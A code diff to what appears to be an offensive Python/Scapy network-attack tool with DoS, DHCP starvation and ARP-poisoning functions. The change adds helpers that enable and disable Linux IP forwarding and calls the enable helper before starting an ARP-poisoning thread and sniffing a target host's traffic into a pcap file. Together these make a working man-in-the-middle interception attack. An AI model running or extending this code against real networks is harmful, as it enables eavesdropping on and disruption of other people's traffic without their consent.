@@ -95,6 +95,13 @@ def dos_attack(target_ip, port=1):
         except:
             print("something went wrong")
 
+def enable_ip_forwarding():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+
+def disable_ip_forwarding():
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+
 
 def starvation_attack():
     conf.checkIPaddr = False
@@ -134,12 +141,13 @@ while 1:
             print()
             continue
         else:
+            enable_ip_forwarding()
             poison_thread = threading.Thread(target=arp_poison, args=(target_ip,))
             poison_thread.start()
             sniff_filter = "ip host " + target_ip
             print(f"[*] Starting network capture. Packet Count: {packet_count}. Filter: {sniff_filter}")
             packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
-            packets = sniff(iface=conf.iface, prn=mitm_callback, filter="tcp", store=0)
+ #          packets = sniff(iface=conf.iface, prn=mitm_callback, filter="tcp", store=0)
             wrpcap(target_ip + "_capture.pcap", packets)
 
     elif option == "3":
